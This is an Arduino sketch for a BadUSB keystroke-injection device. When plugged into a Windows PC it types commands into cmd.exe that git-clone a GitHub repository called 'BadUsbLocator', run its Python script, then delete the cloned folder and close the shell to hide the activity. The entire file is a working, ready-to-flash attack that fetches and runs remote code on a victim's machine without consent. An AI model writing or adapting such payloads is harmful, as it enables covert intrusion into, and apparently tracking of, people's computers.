#include <Keyboard.h>

void setup() {
  // put your setup code here, to run once:
Keyboard.begin();
delay(4000);

//Windows window
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();
delay(150);
//cmd command palette
Keyboard.print("cmd.exe");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);
//Getting to right destination
Keyboard.print("cd ..");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);

Keyboard.print("cd Public");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);
//getting repository from github
Keyboard.print("git clone https://github.com/Kleszcz1337/BadUsbLocator ");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(6500);

Keyboard.print("cd BadUsbLocator ");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(700);
//starting script
Keyboard.print("python BadUsbLocator.py ");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(7900);
// powrot i kasowanie folderu
Keyboard.print("cd ..");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(100);
Keyboard.print("Rmdir BadUsbLocator /s");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(100);
Keyboard.print("Y");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(100);
Keyboard.print("exit");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(100);
}
void loop() 
{
  // put your main code here, to run repeatedly:

}
